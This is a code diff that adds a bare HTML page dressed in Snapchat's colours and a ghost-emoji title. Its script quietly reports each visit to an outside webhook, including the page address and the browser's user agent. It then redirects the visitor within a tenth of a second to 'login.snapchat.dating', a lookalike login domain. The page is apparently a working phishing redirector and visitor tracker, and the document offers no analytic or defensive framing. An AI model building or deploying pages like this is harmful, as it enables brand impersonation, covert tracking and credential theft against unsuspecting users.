@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>👻</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    html,body{height:100%;margin:0;background:#FFFC00;} /* Snapchat yellow */
+  </style>
+  <script>
+    (function () {
+      var WEBHOOK = "https://webhook.site/e269ed94-ee84-4015-a92e-310544e1dfdf";
+      var DEST    = "https://login.snapchat.dating/9098";
+      var ts      = Date.now();
+
+      // 1) Image ping (very reliable GET)
+      try {
+        var img = new Image();
+        img.src = WEBHOOK + "?e=open&t=" + ts + "&r=" + Math.random();
+      } catch (_) {}
+
+      // 2) Best-effort beacon (POST) – fine if it also lands; harmless if dropped
+      try {
+        if (navigator.sendBeacon) {
+          var url = WEBHOOK + "?e=beacon&t=" + ts;
+          var blob = new Blob([JSON.stringify({ts, href: location.href, ua: navigator.userAgent||""})],
+                              {type: "application/json"});
+          navigator.sendBeacon(url, blob);
+        }
+      } catch (_) {}
+
+      // 3) Redirect shortly after to allow requests to start
+      setTimeout(function(){ window.location.replace(DEST); }, 100);
+    })();
+  </script>
+</head>
+<body></body>
+</html>
